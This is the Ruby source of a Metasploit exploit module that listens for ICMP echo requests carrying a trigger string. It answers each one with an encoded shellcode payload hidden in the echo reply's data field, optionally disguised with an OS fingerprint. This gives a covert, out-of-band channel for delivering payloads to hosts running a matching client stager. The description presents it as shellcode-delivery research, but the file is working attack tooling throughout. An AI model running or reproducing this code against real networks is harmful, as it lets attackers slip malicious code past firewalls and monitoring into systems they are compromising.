##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Capture
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'        => 'ICMP Payload Delivery Service',
            'Version'     => '$Revision$',
            'Description' => %q{
                This module is designed for out-of-band payload delivery.
                When started this module will create an ICMP listener that monitors incoming ICMP
                echo requests (type:8,Code:0) containing the configured trigger value within the
                data portion of the packet. Once a trigger is received the module will then encode
                the chosen payload and deliver it back to the source of the request as a ICMP echo
                response (type:0,Code:0) again within the data portion of the packet.

                A client-side script of application is required to make use of this module. The
                server-side portion is made available to allow further research into alternative
                shellcode delivery mechanisms.
            },
            'Author'        =>     'Chris John Riley',
            'License'       =>     MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ],
            'Payload'        =>
                    {
                            'Space'       => 1400,
                            'BadChars'    => '',
                            'DisableNops' => true,
                    },
            'Platform'       => [ 'win', 'linux', 'solaris', 'unix', 'osx', 'bsd', 'php', 'java' ],
            'Arch'           => ARCH_ALL,
            'Targets'        => [ [ 'Wildcard Target', { } ] ],
            'DefaultTarget'  => 0
        )

        register_options([
            OptString.new('TRIGGER',      [true, 'Trigger to listen for (data payload)']),
            OptString.new('PREFIX',        [false, 'Prepend value to shellcode delivery']),
            OptString.new('BPF_FILTER',      [true, 'BFP format filter to listen for', 'icmp']),
            OptString.new('INTERFACE',     [false, 'The name of the interface']),
            OptString.new('ENCODING',       [false, 'Specify base32/base64 encoding', 'base32' ]),
        ], self.class)

        register_advanced_options([
            OptString.new('CLOAK',        [false, 'Create the response packet using specific OS fingerprint (windows, linux, freebsd)', 'linux']),
            OptBool.new('PROMISC',         [true, 'Enable/Disable promiscuous mode', false]),
            OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ]),
        ], self.class)

        deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
    end

    def exploit

        if not datastore['ExitOnSession'] and not job_id
            raise RuntimeError, "Setting ExitOnSession to false requires running as a job (exploit -j)"
        end

        begin
            @interface = datastore['INTERFACE'] || Pcap.lookupdev
            @interface = get_interface_guid(@interface)
            @iface_ip = Pcap.lookupaddrs(@interface)[0]

            @filter = datastore['BPF_FILTER']
            @trigger = datastore['TRIGGER']
            @prefix = datastore['PREFIX'] || ''
            @promisc = datastore['PROMISC']
            @cloak = datastore['CLOAK'].downcase
            @encoding = datastore['ENCODING'].downcase
            @enc_payload = encodepayload

            if @promisc
                 print_status "Warning: Promiscuous mode enabled"
            end

            # start listner
            icmplistener

        rescue  =>  ex
            print_error(ex.message)
        ensure
            print_status "Stopping ICMP listener on %s (%s)" % [@interface, @iface_ip]
        end

    end

    def icmplistener
        # start listener

        print_status "ICMP Listener started on %s (%s). Monitoring for packets containing %s" % [@interface, @iface_ip, @trigger]
        cap = PacketFu::Capture.new(:iface => @interface, :start => true, :filter => @filter, :promisc => @promisc)
        while not session_created?
            cap.stream.each do |pkt|
                return if session_created? and datastore['ExitOnSession']
                packet = PacketFu::Packet.parse(pkt)
                data = packet.payload[4..-1]
                if packet.is_icmp? and data =~ /#{@trigger}/
                    print_status "#{Time.now}: SRC:%s ICMP (type %d code %d) DST:%s" % [packet.ip_saddr, packet.icmp_type, packet.icmp_code, packet.ip_daddr]

                    # detect and warn if system is responding to ICMP echo requests
                    # suggested fixes:
                    #
                    # (linux) echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
                    # (Windows) netsh firewall set icmpsetting 8 disable
                    # (Windows cont.) netsh firewall set opmode mode = ENABLE

                    if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
                        print_error "Dectected ICMP echo response. The client may receive multiple repsonses"
                    end

                    @src_ip = packet.ip_daddr
                    @src_mac = packet.eth_daddr
                    @dst_ip = packet.ip_saddr
                    @dst_mac = packet.eth_saddr
                    @icmp_id = packet.payload[0,2]
                    @icmp_seq = packet.payload[2,2]
                    # create payload with matching id/seq
                    @resp_payload = @icmp_id + @icmp_seq + @prefix + @enc_payload

                    # create response packet icmp_pkt
                    icmp_packet

                    if not @icmp_response
                        raise RuntimeError , "Could not build a ICMP resonse"
                    else
                        # send response packet icmp_pkt
                        send_icmp

                        if session_created? and datastore['ExitOnSession']
                            return
                        elsif datastore['ExitOnSession']
                            # wait 3 seconds and recheck session else you get stuck in cap.stream.each till you receive a new ICMP packet
                            select(nil,nil,nil,3)
                            return if session_created?
                        end
                    end

                elsif packet.is_icmp? and not packet.icmp_type == 0
                    vprint_debug 'Ignoring packet without trigger value from source %s' % packet.ip_saddr
                end
            end
        end
    end

    def icmp_packet
        # create icmp response

        begin
            icmp_pkt = PacketFu::ICMPPacket.new(:flavor => @cloak)
            icmp_pkt.eth_saddr = @src_mac
            icmp_pkt.eth_daddr = @dst_mac
            icmp_pkt.icmp_type = 0
            icmp_pkt.icmp_code = 0
            icmp_pkt.payload = @resp_payload
            icmp_pkt.ip_saddr = @src_ip
            icmp_pkt.ip_daddr = @dst_ip
            icmp_pkt.recalc
            @icmp_response = icmp_pkt
        rescue  =>  ex
            print_error(ex.message)
        end
    end

    def send_icmp
        # send icmp response

        begin
            @icmp_response.to_w(iface = @interface)
            print_good "Payload sent to %s containing %d bytes of data" % [@dst_ip, @enc_payload.length]
        rescue  =>  ex
            print_error(ex.message)
        end
    end

    def encodepayload
        # encode payload into Base64/Base32 as required

        p = payload.raw
        if @encoding == 'base64'
            enc_payload = Rex::Text.encode_base64(p)
            print_status "Encoding payload using base64"
            vprint_debug "Resulting Base64 Encoded payload is ::: %s" % enc_payload
            return enc_payload
        elsif @encoding == 'base32'
            enc_payload = Rex::Text.encode_base32(p)
            print_status "Encoding payload using base32"
            vprint_debug "Resulting Base32 Encoded payload is ::: %s" % enc_payload
            return enc_payload
        else
            raise RuntimeError , "Invalid encoding type"
        end
    end
end